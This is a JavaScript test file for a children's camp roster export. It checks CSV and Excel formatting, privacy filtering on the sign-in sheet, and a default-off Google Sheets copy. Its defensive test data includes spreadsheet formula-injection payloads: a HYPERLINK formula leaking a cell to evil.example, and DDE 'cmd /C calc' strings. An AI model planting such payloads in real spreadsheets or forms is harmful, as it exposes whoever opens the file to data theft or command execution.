// Roster downloads (Excel and CSV): the owner's own copy of who is coming, with privacy controls.
//   1. the CSV file is well-formed for Excel and Google Sheets (BOM, quoting, accents) and a
//      parent's text can never become a spreadsheet formula;
//   2. it lists exactly the families holding places (paid, reported, awaiting) and nobody else, and
//      its row count reconciles with the database;
//   3. the "sign-in sheet" profile carries no health, emergency, e-mail or reference details;
//   4. the Excel workbook can be asked for one week and for the sign-in profile, and says it is
//      confidential;
//   5. the Google Sheets copy of camp registrations is OFF unless explicitly switched on.
// (The download route itself, over HTTP, is in roster-http.test.mjs.)
// Against a real throwaway Postgres and the real ExcelJS output. Nothing is mocked.

import ExcelJS from "exceljs";
import { readFileSync } from "node:fs";
import { createTestDatabase } from "./helpers/testdb.mjs";

process.env.DB_POOL_MAX ||= "5";
const testDb = await createTestDatabase();
const { createHarness } = await import("./helpers/harness.mjs");
const h = createHarness();
const { pool, campDb, check, reserveOk, confirmFor, expireHold } = h;
const { buildCampRosterWorkbook } = await import("../../src/lib/campRoster.ts");
const rosterExport = await import("../../src/lib/rosterExport.ts");
const { eraseFamily } = await import("../../src/lib/privacyData.ts");
const { juniorCamps } = await import("../../src/lib/content.ts");

// A small RFC 4180 reader, written independently of the writer so the two can disagree.
function parseCsv(text) {
  const body = text.replace(/^\uFEFF/, "");
  const rows = [];
  let row = [];
  let field = "";
  let inQuotes = false;
  for (let i = 0; i < body.length; i++) {
    const c = body[i];
    if (inQuotes) {
      if (c === '"' && body[i + 1] === '"') { field += '"'; i++; }
      else if (c === '"') inQuotes = false;
      else field += c;
    } else if (c === '"') inQuotes = true;
    else if (c === ",") { row.push(field); field = ""; }
    else if (c === "\r" && body[i + 1] === "\n") { row.push(field); rows.push(row); row = []; field = ""; i++; }
    else field += c;
  }
  if (field !== "" || row.length) { row.push(field); rows.push(row); }
  return rows;
}
const asObjects = (rows) => rows.slice(1).map((r) => Object.fromEntries(rows[0].map((name, i) => [name, r[i]])));

const SENT = { health: "SENTINEL-HEALTH-7f3", emerg: "SENTINEL-EMERG-7f3", email: "sentinel-email-7f3@example.test", second: "+1 514 555 0102" };
const INJECT = {
  health: '=HYPERLINK("http://evil.example/leak?x="&A1,"click me")',
  parent: "+2+3+cmd|' /C notepad'!A1",
  emerg: "-2+3",
  second: "@SUM(1+1)",
  child: "=cmd|' /C calc'!A1",
};

// ---------------------------------------------------------------------------
console.log("=== Setup: families in every state ===");
const A = "2027-06-28";
const B = "2027-07-05";
const fam1 = await reserveOk("one", {
  weekIds: [A, B],
  parentName: "Chantal Côté-Tremblay",
  email: SENT.email,
  secondaryPhone: SENT.second,
  emergencyName: `Mireille "Mimi" Tremblay ${SENT.emerg}`,
  emergencyRelationship: "Tante, côté maternel",
  children: [{ fullName: "Émilie Côté-Bélanger", dateOfBirth: "2016-03-03", age: "10", healthInfo: `Allergie: arachides; EpiPen\nà l'école ${SENT.health}` }],
});
await confirmFor(fam1);
const fam2 = await reserveOk("two", {
  weekIds: [A],
  parentName: INJECT.parent,
  secondaryPhone: INJECT.second,
  emergencyName: INJECT.emerg,
  children: [{ fullName: "Bb Reported", dateOfBirth: "2017-01-01", age: "9", healthInfo: INJECT.health }],
});
await campDb.reportPayment(fam2);
await reserveOk("three", { weekIds: [A], children: [{ fullName: "Cc Pending", dateOfBirth: "2017-02-02", age: "9", healthInfo: "None" }] });
const fam4 = await reserveOk("four", { weekIds: [A], children: [{ fullName: "Dd Released", dateOfBirth: "2017-03-03", age: "9", healthInfo: "None" }] });
await campDb.cancelRegistration(fam4, "family withdrew", { releaseReason: "owner_cancelled" });
const fam5 = await reserveOk("five", { weekIds: [A], children: [{ fullName: "Ee Expired", dateOfBirth: "2017-04-04", age: "9", healthInfo: "None" }] });
await expireHold(fam5, 1);
await campDb.releaseExpiredReservations();
const fam6 = await reserveOk("six", { weekIds: [A], children: [{ fullName: "Ff Erased", dateOfBirth: "2017-05-05", age: "9", healthInfo: "None" }] });
await eraseFamily(fam6);
const fam7 = await reserveOk("seven", { weekIds: [B], children: [{ fullName: "Gg Weekb", dateOfBirth: "2017-06-06", age: "9", healthInfo: "None" }] });
await confirmFor(fam7);
check("setup: 5 families hold places (3 in the first week, and 2 in the second)", (await pool.query(`SELECT count(*)::int AS n FROM registration_spots s JOIN registrations r ON r.id = s.registration_id WHERE s.status = 'active' AND r.anonymized_at IS NULL`)).rows[0].n === 5);

// ---------------------------------------------------------------------------
console.log("\n=== 1. The CSV file is well-formed, and nothing a parent typed can run as a formula ===");
const fullA = await rosterExport.buildRosterCsv({ weekId: A, profile: "full" });
{
  check("it starts with a byte-order mark, so Excel reads accents correctly", fullA.csv.startsWith("\uFEFF"));
  check("lines end CRLF (the standard) and the file ends with one", fullA.csv.endsWith("\r\n") && !/[^\r]\n/.test(fullA.csv.replace(/"[^"]*"/g, '""')));
  const rows = parseCsv(fullA.csv);
  check("every row has as many fields as the header", rows.length > 1 && rows.every((r) => r.length === rows[0].length), `${rows.length} rows x ${rows[0].length}`);
  const recs = asObjects(rows);
  const emilie = parseCsv((await rosterExport.buildRosterCsv({ weekId: B, profile: "full" })).csv);
  const em = asObjects(emilie).find((r) => r["Child's full name"].startsWith("Émilie"));
  check("accents, commas, quotes and a line break inside a field all survive a round trip", em && em["Child's full name"] === "Émilie Côté-Bélanger" && em["Parent / guardian"] === "Chantal Côté-Tremblay" && em["Emergency contact"].includes('"Mimi"') && em["Relationship"] === "Tante, côté maternel" && em["Allergies / medical notes"].includes("EpiPen\nà l'école"), JSON.stringify(em));
  const cells = rows.flat();
  check("no cell begins with = + - @ or a tab/return (the formula-injection characters)", cells.every((c) => !/^[=+\-@\t\r]/.test(c)), cells.filter((c) => /^[=+\-@\t\r]/.test(c)).join(" | "));
  const bb = recs.find((r) => r["Child's full name"] === "Bb Reported");
  check("a formula in the health note is kept as visible text (with a leading apostrophe)", bb && bb["Allergies / medical notes"] === `'${INJECT.health}`, bb?.["Allergies / medical notes"]);
  check("...and so are the parent's name, the emergency name and the second phone", bb["Parent / guardian"] === `'${INJECT.parent}` && bb["Emergency contact"].startsWith("'-2+3") && bb["Secondary phone"] === `'${INJECT.second}`);
  const fam1Row = em;
  check("an ordinary phone number that starts with + is also kept as text, not turned into arithmetic", fam1Row["Secondary phone"] === `'${SENT.second}`);
  check("the number and the age stay plain", em["#"] === "1" && em["Age"] === "10", `${em["#"]} / ${em["Age"]}`);
}

// ---------------------------------------------------------------------------
console.log("\n=== 2. Exactly the families who hold places; the row count reconciles with the database ===");
{
  const recs = asObjects(parseCsv(fullA.csv));
  check("the first week lists the three families holding a place, in name order", recs.map((r) => r["Child's full name"]).join("|") === "Bb Reported|Cc Pending|Émilie Côté-Bélanger", recs.map((r) => r["Child's full name"]).join("|"));
  check("released, expired and erased families are not listed", !recs.some((r) => /Released|Expired|Erased/.test(r["Child's full name"])));
  check("the status says what the owner may rely on", recs.map((r) => r["Payment status"]).join("|") === "Payment reported, not yet verified|Awaiting payment|Paid", recs.map((r) => r["Payment status"]).join("|"));
  check("numbering starts at 1 within the week", recs.map((r) => r["#"]).join(",") === "1,2,3");
  const weekLabel = juniorCamps.weeks.find((w) => w.id === A).label;
  check("the week column names the week the way the site does", recs.every((r) => r["Week"] === weekLabel && r["Week start"] === A), `${recs[0]["Week"]} / ${weekLabel}`);
  check("rowCount says 3", fullA.rowCount === 3);
  const all = await rosterExport.buildRosterCsv({ weekId: "all", profile: "full" });
  const allRecs = asObjects(parseCsv(all.csv));
  const dbCount = (await pool.query(`SELECT count(*)::int AS n FROM registration_spots s JOIN registrations r ON r.id = s.registration_id WHERE s.status = 'active' AND r.anonymized_at IS NULL`)).rows[0].n;
  check("'all weeks' has one row per held place: the same number the database counts", allRecs.length === dbCount && all.rowCount === dbCount, `${allRecs.length} rows, database ${dbCount}`);
  check("'all weeks' is in calendar order", allRecs.map((r) => r["Week start"]).join(",") === [A, A, A, B, B].join(","), allRecs.map((r) => r["Week start"]).join(","));
  const one = asObjects(parseCsv((await rosterExport.buildRosterCsv({ weekId: B, profile: "full" })).csv));
  check("a single week gives only that week", one.length === 2 && one.every((r) => r["Week start"] === B));
  const empty = await rosterExport.buildRosterCsv({ weekId: "2027-08-23", profile: "full" });
  check("a week with nobody still gives a valid file with the header", parseCsv(empty.csv).length === 1 && empty.rowCount === 0);
  let refused = false;
  try { await rosterExport.buildRosterCsv({ weekId: "2099-01-01", profile: "full" }); } catch { refused = true; }
  check("an unknown week is refused, not silently empty", refused);
}

// ---------------------------------------------------------------------------
console.log("\n=== 3. The sign-in sheet carries no health, emergency, email or reference details ===");
{
  const sign = await rosterExport.buildRosterCsv({ weekId: "all", profile: "signin" });
  const full = await rosterExport.buildRosterCsv({ weekId: "all", profile: "full" });
  const forbidden = [SENT.health, SENT.emerg, SENT.email, SENT.second.replace(/^\+/, ""), "Tante", "EpiPen", "GD-"];
  check("none of those details appears anywhere in the sign-in CSV", forbidden.every((f) => !sign.csv.includes(f)), forbidden.filter((f) => sign.csv.includes(f)).join(","));
  check("...but the full CSV has them (so the test is not blind)", forbidden.every((f) => full.csv.includes(f)), forbidden.filter((f) => !full.csv.includes(f)).join(","));
  const sh = parseCsv(sign.csv)[0];
  check("the sign-in header is short and says whether a medical note exists", sh.includes("Medical note on file") && !sh.includes("Allergies / medical notes") && !sh.includes("Parent email") && !sh.includes("Emergency contact"), sh.join(" | "));
  const recs = asObjects(parseCsv(sign.csv));
  const yes = [...new Set(recs.filter((r) => r["Medical note on file"] === "Y").map((r) => r["Child's full name"]))].sort().join("|");
  check("a family that wrote a health note is marked Y, a family that wrote 'None' is marked N", yes === ["Bb Reported", "Émilie Côté-Bélanger"].sort().join("|") && recs.find((r) => r["Child's full name"] === "Cc Pending")["Medical note on file"] === "N", yes);
  check("the sign-in sheet keeps what a check-in needs: child, age, parent, parent phone, payment status", ["Child's full name", "Age", "Parent / guardian", "Parent phone", "Payment status"].every((c) => sh.includes(c)));
}

// ---------------------------------------------------------------------------
console.log("\n=== 4. The Excel workbook: one week or all, full or sign-in, marked confidential ===");
{
  const sheetNames = (wb) => wb.worksheets.map((w) => w.name);
  const everything = await buildCampRosterWorkbook();
  check("with no options it is the same workbook as before (cover + every week, full details)", sheetNames(everything).length === 11 && everything.getWorksheet("Jun 28-Jul 2").getRow(7).getCell(9).value === "Allergies / Medical Notes");
  const oneWeek = await buildCampRosterWorkbook({ weekId: A, profile: "full" });
  check("one week gives the cover sheet and that week only", sheetNames(oneWeek).join("|") === "Read Me First|Jun 28-Jul 2", sheetNames(oneWeek).join("|"));
  const sign = await buildCampRosterWorkbook({ weekId: A, profile: "signin" });
  const ws = sign.getWorksheet("Jun 28-Jul 2");
  const header = [];
  ws.getRow(7).eachCell((c) => header.push(String(c.value)));
  check("the sign-in workbook has no medical, emergency or second-phone columns", !header.some((x) => /Allergies|Emergency|Secondary/.test(x)) && header.some((x) => /Medical note on file/.test(x)), header.join(" | "));
  const buf = await sign.xlsx.writeBuffer();
  const reread = new ExcelJS.Workbook();
  await reread.xlsx.load(buf);
  const text = [];
  reread.eachSheet((s) => s.eachRow((r) => r.eachCell((c) => text.push(String(c.value ?? "")))));
  check("the sign-in workbook, read back, holds none of the health or emergency details", [SENT.health, SENT.emerg, "EpiPen"].every((f) => !text.join("\n").includes(f)));
  const fullText = [];
  (await buildCampRosterWorkbook({ weekId: A, profile: "full" })).eachSheet((s) => s.eachRow((r) => r.eachCell((c) => fullText.push(String(c.value ?? "")))));
  check("the full workbook says it is confidential, on the cover and on each week", fullText.filter((t) => /CONFIDENTIAL/i.test(t)).length >= 2);
  check("the sign-in workbook says so too", (() => { const t = []; sign.eachSheet((s) => s.eachRow((r) => r.eachCell((c) => t.push(String(c.value ?? ""))))); return t.filter((x) => /CONFIDENTIAL/i.test(x)).length >= 2; })());
}

// ---------------------------------------------------------------------------
console.log("\n=== 5. The Google Sheets copy of camp registrations is OFF unless switched on ===");
{
  const effects = readFileSync("src/lib/registrationEffects.ts", "utf8");
  const sheets = await import("../../src/lib/googleSheets.ts");
  check("the copy is guarded by one switch, checked before anything is read or sent", /isCampSheetsCopyEnabled\(\)/.test(effects.slice(effects.indexOf("async function copyToSheets"), effects.indexOf("async function copyToSheets") + 220)));
  const saved = { ...process.env };
  try {
    Object.assign(process.env, { GOOGLE_SERVICE_ACCOUNT_CLIENT_EMAIL: "x@y.iam.gserviceaccount.com", GOOGLE_SERVICE_ACCOUNT_PRIVATE_KEY: "k", GOOGLE_SHEETS_SHEET_ID: "sheet" });
    delete process.env.CAMP_SHEETS_COPY;
    check("with Google fully set up but no switch, the copy is off", sheets.isGoogleSheetsConfigured() === true && sheets.isCampSheetsCopyEnabled() === false);
    process.env.CAMP_SHEETS_COPY = "false";
    check("'false' is off", sheets.isCampSheetsCopyEnabled() === false);
    process.env.CAMP_SHEETS_COPY = "yes";
    check("anything but the word true is off", sheets.isCampSheetsCopyEnabled() === false);
    process.env.CAMP_SHEETS_COPY = "true";
    check("only CAMP_SHEETS_COPY=true turns it on", sheets.isCampSheetsCopyEnabled() === true);
    delete process.env.GOOGLE_SHEETS_SHEET_ID;
    check("and it still needs Google to be set up", sheets.isCampSheetsCopyEnabled() === false);
  } finally {
    for (const k of Object.keys(process.env)) if (!(k in saved)) delete process.env[k];
    Object.assign(process.env, saved);
  }
  const noGoogle = readFileSync("src/app/api/camp-capacity/route.ts", "utf8") + readFileSync("src/lib/registrationService.ts", "utf8") + readFileSync("src/lib/campRoster.ts", "utf8");
  check("availability, registration and the rosters never read Google Sheets", !/googleSheets|getClinicSignups|appendCampRegistration/.test(noGoogle.replace(/\/\/[^\n]*/g, "")));
}

await pool.end();
await testDb.drop();
process.exit(h.finish("roster-export"));
